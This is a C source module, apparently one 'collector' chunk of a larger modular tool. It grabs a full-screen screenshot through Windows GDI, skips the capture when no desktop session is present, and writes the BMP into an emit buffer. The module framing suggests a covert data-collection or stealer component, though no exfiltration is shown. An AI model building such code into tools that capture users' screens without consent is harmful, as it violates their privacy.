// chunk: collectors/screenshot
// depends: core/emit_buffer
// provides: collect_screenshot
// libs: gdi32

#ifndef CHUNK_SCREENSHOT
#define CHUNK_SCREENSHOT

static void collect_screenshot(void) {
    HDC hScreen = GetDC(NULL);
    if (!hScreen) return;
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hMem = CreateCompatibleDC(hScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, h);
    SelectObject(hMem, hBmp);
    BitBlt(hMem, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    DWORD row = ((w * 3 + 3) & ~3);
    DWORD img_sz = row * h;

    BYTE *pixels = (BYTE *)malloc(img_sz);
    if (pixels) {
        GetDIBits(hMem, hBmp, 0, h, pixels, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

        /* Skip if screen is blank (all black = no desktop session) */
        int blank = 1;
        for (DWORD i = 0; i < img_sz && blank; i += row) {
            for (int x = 0; x < w * 3 && blank; x++) {
                if (pixels[i + x] != 0) blank = 0;
            }
        }

        if (!blank) {
            BITMAPFILEHEADER bf = {0};
            bf.bfType = 0x4D42;
            bf.bfSize = sizeof(bf) + sizeof(bi) + img_sz;
            bf.bfOffBits = sizeof(bf) + sizeof(bi);

            emitf("=== SCREENSHOT ===\r\n");
            emitf("  %dx%d BMP (%lu bytes)\r\n", w, h, bf.bfSize);
            emit((const char *)&bf, sizeof(bf));
            emit((const char *)&bi, sizeof(bi));
            emit((const char *)pixels, img_sz);
            emitf("\r\n");
        } else {
            emitf("=== SCREENSHOT ===\r\n");
            emitf("  (skipped: no desktop session)\r\n");
        }
        free(pixels);
    }

    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(NULL, hScreen);
}

#endif
